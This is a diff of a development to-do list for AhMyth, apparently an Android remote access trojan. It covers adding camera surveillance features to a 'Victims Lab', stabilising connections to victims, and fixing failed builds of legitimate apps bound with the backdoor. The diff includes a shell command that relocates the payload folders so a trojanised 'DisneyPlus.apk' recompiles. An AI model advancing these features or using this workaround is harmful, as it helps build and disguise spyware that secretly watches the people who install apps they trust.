@@ -1,8 +1,7 @@
-### Any help on these tasks would be appreciated as I am currently the ONLY ONE working on this project
-#
-1. Integrate Live Camera Preview for the Camera option in the Victims Lab, controlled by the `CameraManager.java` 
+
+1. Integrate Live Camera Preview for the Camera option in the Victims Lab, controlled by the  *CameraManager*  file
      
-       CameraManager.java located @ './AhMyth-Client/app/src/main/java/ahmyth/mine/king/ahmyth/'
+*CameraManager*  file is located @ `~/AhMyth/AhMyth-Client/app/src/main/java/ahmyth/mine/king/ahmyth/CameraManager.java`
 #
 2. Integrate Video Recording for the camera option in the Victims Lab
 #
@@ -14,17 +13,18 @@
 #
 6. Find a way to stop the flickering Victim's Connections with `socket.io-client v2.0.1`, currently needs to maintain `socket.io-client v0.8.3` to hold a connection without flickering back and forth with Connecting and Disconnecting with Victims
 #
-7. Find a `semantic-ui` alternative, as it is causing blocks in upgrading AhMyth's `node_modules` 
-            
-       Warnings when running `npm install semantic-ui@latest` stopping semantic-ui from upgrading
-#
-8. Find out a way to have the `AppCtrl.js` file create a new `smali` or `smali_classes` folder inside decompiled original APK files for the storing of AhMyth files! 
+7. Find a way to upgrade `semantic-ui` or find an alternative, as it's causing blocks in upgrading most of AhMyth's `node_modules` which is likely the reason the AhMyth interface breaks with the default electron version provided by *npm*
 
-My research has revealed that most of the time when a `Building Failed` error arises with `java 11` & `java 8`, it is because the `ahmyth, io, okhttp3 & okio` 
-folders that are normally located inside the `smali` folder of backdoored original APK's, need to be stored in a different `smali` or `smali_classes` folder, 
-i.e something like `smali2` or `smali_classes2` if the directory doesn't exist already
+Warnings + errors when running `npm install semantic-ui@latest` stopping semantic-ui from upgrading
+#
+8. Find out a way to have the `AppCtrl.js` file detect `RANGE ERRORS` with apktool, then create a new `smali_classes` folder inside a decompiled original APK for the storing of AhMyth files when a `RANGE ERROR` is detected with Apktool.
+
+My research has revealed that most of the time when a `Building Failed` error arises with `java 11` & `java 8`, it is mostly because of a `RANGE ERROR` with apktool, 
+which can be fixed by moving the `ahmyth, io, okhttp3 & okio` folders that are normally located inside the `smali` folder of backdoored original APK's, 
+into a `smali_classes` folder, i.e something like `smali_classes2` if the directory doesn't exist already.
 
 When testing this method the results were successful, running the following commands allowed me to manually recompile the AhMyth binded APK that had failed to build before
+
 PS: The name of the APK was "DisneyPlus.apk"
 
 - `cd disneyplus && mkdir smali_classes5 && cd smali && sudo mv ahmyth io okhttp3 okio /$HOME/Downloads/Disneyplus/smali_classes5`
